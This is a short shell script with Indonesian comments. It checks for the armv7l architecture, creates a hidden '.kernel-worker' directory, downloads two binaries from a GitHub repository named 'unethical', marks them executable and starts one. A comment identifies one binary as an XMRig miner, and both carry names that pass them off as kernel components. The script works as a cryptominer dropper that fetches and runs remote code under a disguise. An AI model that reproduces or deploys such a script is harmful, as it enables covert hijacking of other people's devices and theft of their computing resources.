#!/bin/sh
set -e

REPO_URL="https://github.com/anonking-67/unethical/raw/refs/heads/main"
WORKDIR="$HOME/.kernel-worker"

# Memastikan hanya berjalan di arsitektur armv7l
ARCH=$(uname -m)
if [ "$ARCH" != "armv7l" ]; then
    echo "[-] Error: Script ini khusus untuk armv7l. Arsitektur Anda: $ARCH"
    exit 1
fi

mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "[+] Menyiapkan lingkungan armv7l..."

# Download Runner khusus armv7
curl -fsSL -o "runner" "${REPO_URL}/kernel_armv7"
# Download Miner XMRig khusus ARM 32-bit (Pastikan file ini ada di repo Anda)
curl -fsSL -o "kernelARM" "${REPO_URL}/kernelARM"

chmod +x "runner" "kernelARM"

echo "[+] Memulai Runner (Background)..."
./runner

echo "[+] Selesai. Gunakan 'top' atau 'ps' untuk melihat proses."